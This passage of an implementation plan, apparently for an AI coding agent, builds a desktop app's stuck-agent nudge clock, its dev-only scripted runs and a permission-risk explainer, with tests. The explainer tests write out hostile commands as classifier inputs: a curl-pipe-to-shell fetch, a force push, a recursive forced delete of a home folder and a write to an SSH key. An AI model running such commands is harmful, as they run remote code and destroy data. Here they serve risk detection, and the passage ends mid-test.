  off.w.settings = cleanSidekickSettings({ on: true });
  off.sk.settingsChanged();
  assert.equal(off.texts().length, 1, "the switch came on: asked at once");
  assert.equal(w.sets > 0, true);
});

test("a nudge that waited for the gate is shown only if it is still true; one that ran out of time was never given, and a new event brings a new one", () => {
  const { w, sk, tool, advance, texts } = rig();
  tool("ls");
  w.typing = true;
  advance(5 * MIN);
  assert.deepEqual(texts(), [], "held: the user is in the middle of something");
  tool("ls again");
  w.typing = false;
  sk.stateChanged();
  assert.deepEqual(texts(), [], "the agent spoke again: the quiet nudge is no longer true and is forgotten");
  const gone = rig();
  gone.tool("ls");
  gone.w.typing = true;
  gone.advance(5 * MIN + 31_000);
  gone.w.typing = false;
  gone.sk.stateChanged();
  assert.deepEqual(gone.texts(), [], "30 s of waiting is over");
  gone.advance(60 * MIN);
  assert.deepEqual(gone.texts(), [], "dropped: not said later, with nothing new");
  gone.tool("ls again");
  gone.advance(5 * MIN + 1000);
  assert.equal(gone.texts().length, 1, "it counted as given only once shown: the session is nudged for the next quiet");
});

test("two dismissals of a kind mute it; the click on a nudge is stored through the settings", () => {
  const { w, sk, tool, advance, texts } = rig();
  tool("ls");
  advance(5 * MIN);
  assert.equal(texts().length, 1);
  sk.noteDismissed();
  assert.equal(w.settings.dismissals["stuck.silent"], 1);
  advance(2 * MIN);
  w.settings = cleanSidekickSettings({ dismissals: { "stuck.silent": 2 } });
  const m = rig("windows", { dismissals: { "stuck.silent": 2 } });
  m.tool("ls");
  m.advance(10 * MIN);
  assert.deepEqual(m.texts(), [], "muted");
});

test("the clock itself: one timer, the same deadline keeps it, a new one replaces it, null or a time that is not a time stops it, and a far deadline is set for the longest delay", () => {
  const w = { t: 1000, sets: [], cleared: [], fired: 0 };
  const c = new StuckClock({ now: () => w.t, set: (fn, ms) => { w.sets.push(ms); return w.sets.length; }, clear: (id) => w.cleared.push(id) }, () => { w.fired++; });
  assert.equal(c.armed, false);
  c.arm(5000);
  c.arm(5000);
  assert.deepEqual(w.sets, [4000], "the same deadline: no second timer");
  c.arm(9000);
  assert.deepEqual(w.sets, [4000, 8000]);
  assert.deepEqual(w.cleared, [1]);
  for (const bad of [null, Number.NaN, Number.POSITIVE_INFINITY]) c.arm(bad);
  assert.equal(c.armed, false);
  c.arm(500);
  assert.equal(w.sets.at(-1), 0, "a deadline in the past fires at once");
  c.arm(1000 + 60 * 24 * 3600 * 1000);
  assert.equal(w.sets.at(-1), MAX_DELAY_MS);
});

test("no interval, no polling: the Sidekick's one timer is the stuck clock's, and the controller sets it only through the clock", () => {
  const ctl = source("sidekick/controller.ts");
  assert.doesNotMatch(ctl, /setInterval|requestAnimationFrame|setTimeout/);
  assert.equal(ctl.split("env.timer.set").length - 1, 1, "the timer is asked for in one place");
  assert.match(source("sidekick/appenv.ts"), /timer: \{ set: \(fn, ms\) => window\.setTimeout\(fn, ms\), clear: \(id\) => window\.clearTimeout\(id\) \}/);
  assert.doesNotMatch(source("sidekick/stuckclock.ts"), /setInterval/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write the clock and the edits**

`valid` and `updated` join the notes' env (the older tests' fakes are updated in the same script). The controller's `evaluate()` asks `stuckStep`, offers the nudge, re-asks for the next deadline, rewords a waiting nudge at the give-up and sets the clock.

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/stuckclock.ts <<'EOF'
// The stuck clock (sub-project F1, spec "Stuck rules", "The clock"): ONE one-shot timer, set to the nearest deadline of the rules that wait (a request that has waited a minute, an
// agent that has been quiet for five), and not set at all while nothing is live. It is the same idea as the cats' ten-minute nap (island/sleep.ts): no interval, no polling, nothing
// that wakes while the hidden island costs nothing. Every change in the ledger and in the user's presence sets it again. Pure: the timer is given. Loaded by the plain-Node checks.

export interface ClockEnv {
  set(fn: () => void, ms: number): number;
  clear(id: number): void;
  now(): number;
}

/** The longest delay a browser timer takes (about 24.8 days): a deadline further away is set for this long and looked at again when it fires. */
export const MAX_DELAY_MS = 2_147_483_647;

export class StuckClock {
  private readonly env: ClockEnv;
  private readonly fire: () => void;
  private id: number | null = null;
  private at: number | null = null;

  constructor(env: ClockEnv, fire: () => void) {
    this.env = env;
    this.fire = fire;
  }

  /** The clock is set. */
  get armed(): boolean {
    return this.id !== null;
  }

  /** The time (ms, the app's clock) it will fire at, or null while it is not set. */
  get due(): number | null {
    return this.id === null ? null : this.at;
  }

  /** Sets the clock to `at`, or stops it for null (or a time that is not a time). Setting it to the time it already has changes nothing. */
  arm(at: number | null): void {
    if (at === null || !Number.isFinite(at)) {
      this.stop();
      return;
    }
    if (this.id !== null && this.at === at) return;
    this.stop();
    this.at = at;
    const wait = Math.min(MAX_DELAY_MS, Math.max(0, at - this.env.now()));
    this.id = this.env.set(() => {
      this.id = null;
      this.at = null;
      this.fire();
    }, wait);
  }

  stop(): void {
    if (this.id !== null) this.env.clear(this.id);
    this.id = null;
    this.at = null;
  }
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/notes.ts", r'''  /** A held note ran out of time and was dropped. */
  dropped(note: Note): void;
''', r'''  /** A held note ran out of time and was dropped. */
  dropped(note: Note): void;
  /** A note that waited is still true when the gate opens (a nudge about a loop that has since ended is not). A recap is always true. */
  valid(note: Note): boolean;
  /** The words of the note on screen changed in place. */
  updated(note: Note): void;
''')
edit("windows/src/sidekick/notes.ts", r'''    for (const h of [...this.held].sort((a, b) => rank(a.note) - rank(b.note))) {
      if (!this.gate(h.note).show) continue;
      this.held = this.held.filter((x) => x !== h);
      this.show(h.note);
      return;
    }
  }
''', r'''    for (const h of [...this.held].sort((a, b) => rank(a.note) - rank(b.note))) {
      if (!this.gate(h.note).show) continue;
      this.held = this.held.filter((x) => x !== h);
      // It waited: it must still be true now. One that is not is forgotten, not shown late.
      if (!this.env.valid(h.note)) continue;
      this.show(h.note);
      return;
    }
  }

  /** The words of the note on screen change in place (the waiting nudge once the app has given up on the request; a local model's nicer sentence). Not a second note. */
  reword(id: number, lines: string[]): void {
    const v = this.visible;
    if (!v || v.note.id !== id || v.note.lines.join("\n") === lines.join("\n")) return;
    v.note = { ...v.note, lines };
    this.env.updated(v.note);
  }
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/controller.ts", r'''import { recapOf } from "./core.ts";
import type { NoteKind, Platform, SidekickSettings } from "./core.ts";
import { withDismissed } from "./settings.ts";
''', r'''import { STUCK, agentName, nudgeText, recapOf, stuckStep } from "./core.ts";
import type { Nudge, NoteKind, Platform, SidekickSettings, StuckContext } from "./core.ts";
import { withDismissed } from "./settings.ts";
import { StuckClock } from "./stuckclock.ts";

/** The parts of the world a nudge depends on, as one word: when it changes, the rules are asked again. */
const ctxKey = (c: StuckContext): string => `${c.ratelimit === true}|${c.away === true}|${c.cardShown === true}`;
''')
edit("windows/src/sidekick/controller.ts", r'''  /** Opens the island on a note, through the island's own peek (the view the finished task uses). */
  present(note: Note): void;
}
''', r'''  /** Opens the island on a note, through the island's own peek (the view the finished task uses). */
  present(note: Note): void;
  /** The words of the note on screen changed in place. */
  updated(note: Note): void;
  /** One timer at a time is all the Sidekick ever asks for (the stuck clock). */
  timer: { set(fn: () => void, ms: number): number; clear(id: number): void };
}
''')
edit("windows/src/sidekick/controller.ts", r'''  readonly notes: Notes;
  private readonly env: SidekickEnv;
''', r'''  readonly notes: Notes;
  /** The stuck clock: one one-shot timer, set to the nearest deadline of the rules that wait, and not set while nothing is live. */
  readonly clock: StuckClock;
  private lastCtx = "";
  /** Nudges that fell due while the user was away, by what they were about: dropped, never shown later. A new event for the session is a new thing, and lifts it. */
  private readonly droppedWhileAway = new Set<string>();
  private readonly env: SidekickEnv;
''')
edit("windows/src/sidekick/controller.ts", r'''      dismissed: (kind) => this.dismissed(kind),
    });
    this.onReturn.push((r) => this.recap(r));
  }
''', r'''      dismissed: (kind) => this.dismissed(kind),
      valid: (note) => this.stillTrue(note),
      updated: (note) => env.updated(note),
    });
    this.clock = new StuckClock({ set: (fn, ms) => env.timer.set(fn, ms), clear: (id) => env.timer.clear(id), now: () => env.now() }, () => this.evaluate());
    // First: a nudge that fell due while the user was away is dropped (the recap covers it), then the recap.
    this.onReturn.push(() => this.dropDueWhileAway());
    this.onReturn.push((r) => this.recap(r));
  }
''')
edit("windows/src/sidekick/controller.ts", r'''      // The sidekick never breaks the island.
    }
    void this.sampleIdle();
  }
''', r'''      // The sidekick never breaks the island.
    }
    this.evaluate();
    void this.sampleIdle();
  }
''')
edit("windows/src/sidekick/controller.ts", r'''    if (word === "unlock" || word === "wake" || word === "displayOn") void this.sampleIdle(true);
  }
''', r'''    // Away or back changes what may be said, and a one-shot timer does not fire while the machine sleeps: the rules are asked again at once.
    this.evaluate();
    if (word === "unlock" || word === "wake" || word === "displayOn") void this.sampleIdle(true);
  }
''')
edit("windows/src/sidekick/controller.ts", r'''  /** The app's state changed (the island's `State.notify`): held notes get another look, and a note folded away unseen is forgotten. Cheap when nothing is held or shown. */
  stateChanged(): void {
    try {
      this.notes.stateChanged();
    } catch {
      // The sidekick never breaks the island.
    }
  }

  /** The Sidekick settings changed in Settings (a switch, an Unmute): the gate looks again. */
  settingsChanged(): void {
    if (this.env.settings().on === false) this.notes.clear();
    this.stateChanged();
  }
''', r'''  /**
   * The app's state changed (the island's `State.notify`): held notes get another look, and a note folded away unseen is forgotten. The stuck rules are asked again only when
   * something they depend on changed (a card came or went, the rate limit started or ended). Cheap when nothing is held, shown or different.
   */
  stateChanged(): void {
    try {
      this.notes.stateChanged();
      if (ctxKey(this.context()) !== this.lastCtx) this.evaluate();
    } catch {
      // The sidekick never breaks the island.
    }
  }

  /** The Sidekick settings changed in Settings (a switch, an Unmute): the gate looks again. */
  settingsChanged(): void {
    if (this.env.settings().on === false) this.notes.clear();
    this.stateChanged();
    this.evaluate();
  }

  /** What a nudge is about, to the moment: its kind, its session, and the session's last event and pending request. */
  private signature(n: Nudge): string {
    const s = this.ledger.snapshot.sessions.find((x) => x.key === n.key);
    return `${n.kind}|${n.key}|${s?.lastEventAt ?? 0}|${s?.pendingApprovalAt ?? 0}`;
  }

  /** The user came back. The nudge that would fire now fell due while they were away: it is dropped, not kept for later, and it does not count as given (nothing was shown). */
  private dropDueWhileAway(): void {
    try {
      const r = stuckStep(this.ledger.snapshot, this.env.now(), { ...this.context(), away: false });
      if (r.nudge) this.droppedWhileAway.add(this.signature(r.nudge));
      if (this.droppedWhileAway.size > 64) this.droppedWhileAway.clear();
    } catch {
      // The sidekick never breaks the island.
    }
  }

  private context(): StuckContext {
    return { ratelimit: this.env.world.ratelimit(), away: this.presence.away, cardShown: this.env.world.ownCard(), platform: this.env.platform };
  }

  /**
   * Asks the stuck rules what, if anything, an agent should be nudged about now, offers it to the gate, and sets the clock to the next deadline (or stops it: with the switch off,
   * the user away, an agent rate-limited or nothing live there is no deadline). Called when a hook event comes, when the presence or the world changes, and when the clock fires.
   */
  evaluate(): void {
    try {
      const now = this.env.now();
      this.ledger.prune(now);
      const ctx = this.context();
      this.lastCtx = ctxKey(ctx);
      if (!this.env.settings().on) {
        this.clock.stop();
        return;
      }
      let r = stuckStep(this.ledger.snapshot, now, ctx);
      if (r.nudge && !this.droppedWhileAway.has(this.signature(r.nudge))) {
        const text = nudgeText(r.nudge, this.ledger.snapshot, now, ctx);
        this.notes.offer({ kind: r.nudge.kind, agentId: r.nudge.agentId, key: r.nudge.key, lines: [text], facts: [this.nudgeFacts(r.nudge, text)], awaySince: null });
        r = stuckStep(this.ledger.snapshot, now, ctx);
      }
      this.rewordWaiting(now, ctx);
      this.clock.arm(this.deadline(r.nextAt, now));
    } catch {
      // The sidekick never breaks the island.
    }
  }

  /** The facts a nudge's words were written from: the agent's name and the numbers in the words. Nothing of the work. */
  private nudgeFacts(nudge: Nudge, text: string): unknown {
    return { agent: agentName(nudge.agentId), agentId: nudge.agentId, kind: nudge.kind, counts: (text.match(/\d+/g) ?? []).map(Number) };
  }

  /** The earliest deadline: the rules' own, and the moment the app gives up on a request a waiting nudge is on screen for (its words then change in place). */
  private deadline(nextAt: number | null, now: number): number | null {
    let at = nextAt;
    const v = this.notes.current;
    if (v !== null && v.kind === "stuck.waiting") {
      const s = this.ledger.snapshot.sessions.find((x) => x.key === v.key);
      const giveUp = s?.pendingApprovalAt == null ? null : s.pendingApprovalAt + STUCK.GIVE_UP_MS[this.env.platform];
      if (giveUp !== null && giveUp > now && (at === null || giveUp < at)) at = giveUp;
    }
    return at;
  }

  /** Once the app has given up on the request, the waiting nudge says the terminal has it. That is the same note with other words, not a second nudge. */
  private rewordWaiting(now: number, ctx: StuckContext): void {
    const v = this.notes.current;
    if (v === null || v.kind !== "stuck.waiting") return;
    const nudge: Nudge = { kind: "stuck.waiting", reasonId: "waiting", key: v.key, agentId: v.agentId };
    this.notes.reword(v.id, [nudgeText(nudge, this.ledger.snapshot, now, ctx)]);
  }

  /** A nudge that waited for the gate is only shown if it is still true. A recap always is. */
  private stillTrue(note: Note): boolean {
    if (note.kind === "recap") return true;
    const r = stuckStep(this.ledger.snapshot, this.env.now(), { ...this.context(), away: false });
    return r.nudge !== null && r.nudge.kind === note.kind && r.nudge.key === note.key;
  }
''')
PY
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/sidekick/appenv.ts", r'''    present: (note) => {
      State.sidekickNote = note;
      island.alert("sidekick");
    },
''', r'''    present: (note) => {
      State.sidekickNote = note;
      island.alert("sidekick");
    },
    updated: (note) => {
      State.sidekickNote = note;
      State.notify();
    },
    // The stuck clock's one timer. Nothing else in the Sidekick sets one.
    timer: { set: (fn, ms) => window.setTimeout(fn, ms), clear: (id) => window.clearTimeout(id) },
''')
edit("windows/scripts/sidekick-tests/notes.test.mjs", r'''    nudged: (key) => w.nudged.has(key),
    present: (n) => w.presented.push(n),''', r'''    nudged: (key) => w.nudged.has(key), valid: () => w.valid !== false, updated: (n) => w.updated.push(n),
    present: (n) => w.presented.push(n),''')
edit("windows/scripts/sidekick-tests/notes.test.mjs", r'''    presented: [], shown: [], dropped: [], dismissed: [],
  };''', r'''    presented: [], shown: [], dropped: [], dismissed: [], updated: [], valid: true,
  };''')
edit("windows/scripts/sidekick-tests/notes.test.mjs", r'''    nudged: () => false, shown: () => {}, dropped: () => {}, dismissed: () => {},''', r'''    nudged: () => false, valid: () => true, updated: () => {}, shown: () => {}, dropped: () => {}, dismissed: () => {},''')
edit("windows/scripts/sidekick-tests/notes.test.mjs", r'''    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true }, present: (n) => w.presented.push(n),
  });''', r'''    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true }, present: (n) => w.presented.push(n),
    updated: () => {}, timer: { set: () => 1, clear: () => {} },
  });''')
edit("windows/scripts/sidekick-tests/presence.test.mjs", r'''    now: () => w.t, platform: "windows",
    idleSeconds: () => {''', r'''    now: () => w.t, platform: "windows",
    settings: () => ({ on: true, local: true, dismissals: {} }), saveSettings: () => {}, present: () => {}, updated: () => {}, timer: { set: () => 1, clear: () => {} },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
    idleSeconds: () => {''')
edit("windows/scripts/sidekick-tests/ledger.test.mjs", r'''  const sk = new Sidekick({ now: () => t, platform: "windows", idleSeconds: idle });''', r'''  const sk = new Sidekick({
    now: () => t, platform: "windows", idleSeconds: idle, settings: () => ({ on: true, local: true, dismissals: {} }), saveSettings: () => {}, present: () => {}, updated: () => {}, timer: { set: () => 1, clear: () => {} },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
  });''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 62`, `ℹ pass 62`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

- [ ] **Step 3: Prove the clock's rules bite**

A nudge about a loop that ended must not be shown late (`valid`), and the clock must stay unset while the switch is off.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/controller.ts "return r.nudge !== null && r.nudge.kind === note.kind && r.nudge.key === note.key;" "return true;" scripts/sidekick-tests/stuck.test.mjs )
```

Expected: `# fail 1`.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/controller.ts $'      if (!this.env.settings().on) {\n        this.clock.stop();' $'      if (false) {\n        this.clock.stop();' scripts/sidekick-tests/stuck.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 4: The dev server's scripted runs**

`__nm.run.recap()` and the others send the island the hook events a real agent would, and `__nm.skew(ms)` moves the Sidekick's clock, so a recap after minutes away, a loop, a request nobody answered and a quiet agent can be looked at in seconds. They are loaded only behind `import.meta.env.DEV`, so a release build holds none of their words (`dev.test.mjs` pins it).

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/dev.ts <<'EOF'
// The Sidekick's scripted runs for the dev server (sub-project F1): `window.__nm.run.recap()` and the others feed the island the hook events a real agent would send, and move the Sidekick's
// clock forward (`__nm.skew(ms)`), so that a recap after minutes away, a loop, a request nobody answered and a quiet agent can be looked at in seconds and in pictures. The dev server only:
// main.ts loads this behind `import.meta.env.DEV`, so a release build does not contain it. Nothing here is the app's own behaviour: it only sends events and moves a clock.

import type { Island } from "../island/island";
import type { HookPayload } from "../island/hooks";
import { Skew } from "./appenv";
import type { Sidekick } from "./controller.ts";

const MIN = 60_000;

export function sidekickScenarios(island: Island, sk: Sidekick, hook: (p: HookPayload) => void) {
  const ev = (name: string, extra: Partial<HookPayload> = {}, agent?: string) =>
    hook({ hook_event_name: name, session_id: agent ? `dev-${agent}` : "dev-claude", cwd: "C:/work/app", ...(agent ? { nm_agent: agent } : {}), ...extra });
  const bash = (command: string, name = "PostToolUse", agent?: string) => ev(name, { tool_name: agent ? "run_shell_command" : "Bash", tool_input: { command } }, agent);
  const edit = (file: string) => ev("PostToolUse", { tool_name: "Edit", tool_input: { file_path: `C:/work/app/src/${file}` } });
  // The launch greeting is a view of its own: a note waits for it (as it should), so each run starts by folding the island, which ends it.
  const quietIsland = () => island.collapse();
  const skew = (ms: number) => {
    Skew.ms += ms;
    sk.evaluate();
  };
  return {
    skew,
    /** Locked, an agent works for five minutes and finishes, unlocked: the recap. */
    recap() {
      quietIsland();
      sk.presenceSignal("lock");
      ev("PreToolUse", { tool_name: "Edit", tool_input: { file_path: "C:/work/app/src/a.ts" } });
      edit("a.ts");
      edit("b.ts");
      bash("npm test");
      ev("PostToolUseFailure", { tool_name: "Bash", tool_input: { command: "npm test" } });
      skew(5 * MIN);
      ev("Stop");
      sk.presenceSignal("unlock");
    },
    /** The same step four times. */
    loop() {
      quietIsland();
      for (let i = 0; i < 4; i++) bash("npm test");
    },
    errors() {
      quietIsland();
      for (let i = 0; i < 3; i++) ev("PostToolUseFailure", { tool_name: "Bash", tool_input: { command: `build step ${i}` } });
    },
    /** A request nobody has answered for a minute, its card not on screen. */
    waiting() {
      ev("PermissionRequest", { tool_name: "Bash", tool_input: { command: "npm install left-pad" }, request_id: "dev-wait" });
      island.collapse();
      skew(61_000);
    },
    quiet() {
      quietIsland();
      bash("npm run build");
      skew(5 * MIN + 1000);
    },
    /** A permission request of each risk, for the card: `run.card("high")`, `"medium"` or `"low"`. */
    card(risk: "high" | "medium" | "low" = "high") {
      const input = { high: { command: "git push --force origin main" }, medium: { command: "npm install left-pad" }, low: { command: "npm test" } }[risk];
      ev("PermissionRequest", { tool_name: "Bash", tool_input: input, request_id: `dev-card-${risk}` });
    },
    /** Two other agents running, for the drop on an agent's cat (open `?display=perAgent`). */
    agents() {
      bash("ls", "PreToolUse", "gemini");
      bash("ls", "PreToolUse", "antigravity");
    },
  };
}
EOF
```

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/dev.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { source } from "./util.mjs";

test("the scripted runs are for the dev server only: main.ts loads them behind import.meta.env.DEV and a dynamic import, nothing else imports them, and a release build holds none of their words", () => {
  const main = source("main.ts");
  const at = main.indexOf('import("./sidekick/dev")');
  assert.ok(at > 0);
  assert.ok(main.lastIndexOf("if (import.meta.env.DEV) {", at) > main.indexOf("Hub.sk = new Sidekick("), "inside a DEV block, after the Sidekick exists");
  assert.equal(main.split("sidekick/dev").length - 1, 1);
  for (const f of fs.readdirSync(new URL("../../src/", import.meta.url), { recursive: true })) {
    if (typeof f === "string" && f.endsWith(".ts") && !f.endsWith("main.ts") && !f.endsWith("sidekick/dev.ts")) assert.doesNotMatch(fs.readFileSync(new URL(`../../src/${f}`, import.meta.url), "utf8"), /sidekick\/dev"|sidekick\/dev\.ts"/, f);
  }
  const dev = source("sidekick/dev.ts");
  assert.match(dev, /export function sidekickScenarios\(/);
  for (const run of ["recap", "loop", "errors", "waiting", "quiet", "card", "agents", "skew"]) assert.ok(dev.includes(`${run}(`), run);
});

test("the clock knob is always 0 in the app: only the dev runs move it", () => {
  assert.match(source("sidekick/appenv.ts"), /export const Skew = \{ ms: 0 \};/);
  const movers = fs.readdirSync(new URL("../../src/", import.meta.url), { recursive: true }).filter((f) => typeof f === "string" && f.endsWith(".ts") && /Skew\.ms\s*(\+|=)/.test(fs.readFileSync(new URL(`../../src/${f}`, import.meta.url), "utf8")));
  assert.deepEqual(movers.map((f) => f.replaceAll("\\", "/")), ["sidekick/dev.ts"]);
});
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src/main.ts", r'''  if (import.meta.env.DEV) (window as unknown as { __nm: { sk: unknown } }).__nm.sk = Hub.sk;''', r'''  if (import.meta.env.DEV) (window as unknown as { __nm: { sk: unknown } }).__nm.sk = Hub.sk;
  // Dev server only: scripted runs of the Sidekick (`__nm.run.recap()`, `loop()`, `waiting()`, `quiet()`, `card("high")`...) and its clock (`__nm.skew(ms)`), for the pictures and the owner's look.
  if (import.meta.env.DEV) {
    void import("./sidekick/dev").then(({ sidekickScenarios }) => {
      const run = sidekickScenarios(island, Hub.sk!, (p: HookPayload) => handleHook(island, p));
      Object.assign((window as unknown as { __nm: Record<string, unknown> }).__nm, { run, skew: run.skew });
    });
  }''')
PY
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 64`, `ℹ pass 64`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

- [ ] **Step 5: Look at two nudges**

Each picture is one scripted run on a fresh page (`shot.sh` from "How to run"):

```bash
( cd .claude/checkpoints/f1-tauri && playwright-cli -s=f1 resize 760 340 > /dev/null; bash shot.sh "" "window.__nm.run.loop()" scn-loop; bash shot.sh "" "window.__nm.run.waiting()" scn-waiting )
```

Expected: `"sidekick"`, `scn-loop.png`, `scn-waiting.png`.

Say what you saw: **"Claude Code has run the same step 4 times."** with **Not now** and **Open terminal**; and, for the request nobody answered, **"Claude Code is still waiting for your OK."** The agent's name in the grey line is the pill's own ("VS Code" is how the island has always labelled Claude Code).

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): stuck nudges: the one-shot clock, the four rules and the dev server's scripted runs

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 8: The permission line, the badge and the surprised emote

**Files:**
- Create: `windows/src/sidekick/explain.ts`, `windows/scripts/sidekick-tests/explain.test.mjs`
- Modify: `windows/src/sidekick/controller.ts`, `appenv.ts`, `windows/src/core/state.ts` (`ApprovalInfo`), `windows/src/core/bridge.ts` (`BootInfo.home`), `windows/src/island/hooks.ts`, `windows/src/island/island.ts` (`emote`), `windows/src/views/views.ts` (`buildApproval`), `windows/src/main.ts`, `windows/src/style.css`, `windows/src-tauri/src/lib.rs` (`BootInfo.home`)

**Interfaces:**
- Consumes: Task 1's `explain`, `REASONS`, `Explained`, `Risk`; Task 4's `Sidekick`, `SidekickEnv`.
- Produces: `explainRequest(tool, input, cwd, home) → Explained`, `wasCut(tool, input)`, `badgeText(risk)`, `RELAY_CUT_BYTES` (`explain.ts`); `SidekickEnv.home`, `Sidekick.explain(tool, input, cwd)`; `ApprovalInfo.target?`, `risk?`, `line?`; `BootInfo.home` (Rust gives the user's home folder, to read `~` in a path; it is never shown, logged or sent); `Island.emote(name)`.

**The card stays as it ships.** `approvalTarget` is untouched (a test pins its last line); the card's command line is as it was. The additions: one `div.sk-why` between the command and the buttons (11 px, `#8E939C`, one line, ellipsis), a `span.sk-badge` "High risk" appended to the "who" row on a high risk only, both set in `sync()`; **the button row is not touched** (its `rowKey` guard is what keeps a mouse-down and a mouse-up from landing on different buttons). A high risk gives the existing `surprised` emote once, **unless the desktop cat is out**: its alert emote is that one. **The relay's cut** (the Windows relay cuts every string at 2000 bytes and adds "…"): `explainRequest` reads a cut command, or a cut path of a non-shell tool, as at least `unsure` (medium) when the rules read it as low; a label that is already medium or high stays; a cut file body (`content`, `new_string`) does not matter to the label.

- [ ] **Step 1: Write the test**

Windows-shaped requests (backslash paths, PowerShell), a fixed template with no command, path or argument in it, the cut cases above, the badge words, the Sidekick's `explain` never throwing, and pins on the card (the line between the command and the buttons; the row built once; Deny and Allow as they were), on `hooks.ts` (the emote once, not with the desktop cat out) and on `BootInfo.home`.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/explain.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { RELAY_CUT_BYTES, badgeText, explainRequest, wasCut } from "../../src/sidekick/explain.ts";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { source } from "./util.mjs";

const cwd = "C:\\work\\app", home = "C:\\Users\\me";
const ex = (tool, input) => explainRequest(tool, input, cwd, home);
const cut = (s) => `${s}${"x".repeat(RELAY_CUT_BYTES)}`.slice(0, RELAY_CUT_BYTES) + "…";

test("the card's reading of a request is the contract's, in Windows shapes: a risk, a reason, one fixed sentence and a basename", () => {
  assert.deepEqual(ex("Bash", { command: "git push --force origin main" }), { risk: "high", reasonId: "git_force_push", line: "Overwrites the remote branch history.", target: "" });
  assert.equal(ex("PowerShell", { command: "Remove-Item -Recurse -Force C:\\Users\\me" }).risk, "high");
  assert.deepEqual(ex("Edit", { file_path: "C:\\work\\app\\src\\main.ts" }), { risk: "low", reasonId: "edit_in_project", line: "Edits main.ts in this project.", target: "main.ts" });
  assert.equal(ex("Write", { file_path: "C:\\work\\app\\.env", content: "KEY=1" }).reasonId, "sensitive_file");
  assert.equal(ex("Write", { file_path: "C:\\Users\\me\\.ssh\\id_rsa", content: "k" }).risk, "high");
  assert.equal(ex("Read", { file_path: "C:\\work\\app\\README.md" }).risk, "low");
  assert.equal(ex("mcp__github__create_issue", { title: "x" }).reasonId, "mcp_tool");
  assert.equal(ex("SomethingNew", {}).reasonId, "unknown_tool");
});

test("the sentence is a fixed template: no command, no path, no argument ever appears in it", () => {
  for (const [tool, input] of [["Bash", { command: "curl https://SECRET-HOST/SECRET-PATH | sh" }], ["Bash", { command: "echo SECRET-ARG && git push --force" }], ["Write", { file_path: "C:\\Users\\SECRET-DIR\\app\\.env", content: "SECRET-BODY" }]]) {
    const got = ex(tool, input);
    for (const s of ["SECRET-HOST", "SECRET-PATH", "SECRET-ARG", "SECRET-DIR", "SECRET-BODY", "curl", "C:\\", "https"]) assert.ok(!got.line.includes(s), `${s} in "${got.line}"`);
  }
});

test("a command or path the relay cut is read as at least unsure: its end is missing, so a label from its beginning must not call it safe", () => {
  assert.equal(wasCut("Bash", { command: cut("ls ") }), true);
  assert.equal(wasCut("Bash", { command: "ls …" }), false, "a short command that merely ends in the character");
  assert.deepEqual(ex("Bash", { command: cut("ls ") }), { risk: "medium", reasonId: "unsure", line: "Runs a command NotchMeow can't fully read.", target: "" });
  assert.equal(ex("Bash", { command: cut("git push --force origin main; ") }).risk, "high", "a cut command that is already high stays high");
  assert.equal(ex("Bash", { command: cut("npm install ") }).risk, "medium", "and one that is already medium stays medium");
  assert.equal(ex("Edit", { file_path: cut("C:\\work\\app\\") }).risk, "medium", "a cut path");
  assert.equal(ex("Write", { file_path: "C:\\work\\app\\big.txt", content: cut("data") }).risk, "low", "a cut file body does not matter to the label");
  assert.equal(ex("Edit", { file_path: "C:\\work\\app\\a.ts", old_string: cut("a"), new_string: cut("b") }).risk, "low");
  const multibyte = `${"é".repeat(1000)}…`;
  assert.equal(wasCut("Bash", { command: multibyte }), true, "2000 bytes of two-byte characters");
